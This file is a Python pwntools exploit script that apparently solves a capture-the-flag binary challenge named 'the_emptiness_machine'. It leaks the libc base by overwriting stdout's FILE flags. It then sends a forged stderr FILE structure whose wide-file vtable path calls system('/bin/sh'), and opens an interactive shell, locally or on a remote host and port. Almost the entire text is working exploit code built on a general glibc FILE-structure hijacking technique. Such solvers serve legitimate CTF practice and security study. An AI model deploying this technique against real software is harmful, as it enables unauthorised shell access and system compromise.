#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

fname = './the_emptiness_machine' 

LOCAL = True#False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

libc = ELF('./glibc/libc.so.6', checksec=False)

# Leak libc
r.sendlineafter(b'interaction: ', p64(0xfbad1887) + b'\x00' * 0x18)

libc.address = u64(r.recv(8)) - libc.sym._IO_2_1_stdout_ - 132

print(f'Libc base: {libc.address:#04x}')

# Construct a fake stderr structure in memory, overwriting its function pointers so that when libc flushes or closes stderr, it ends up calling system("/bin/sh")
pl  = p64(0x3b68733b40404040)
pl += p64(0) * 4 + p64(1) + p64(0) * 7
pl += p64(libc.sym.system) + p64(0) * 3
pl += p64(libc.sym._IO_2_1_stderr_ - 0x10) + p64(0) 
pl += p64(libc.sym._IO_2_1_stderr_) + p64(libc.sym._IO_2_1_stderr_ - 0x48)
pl += p64(0) * 6 + p64(libc.sym._IO_wfile_jumps)

r.sendline(pl)
r.interactive()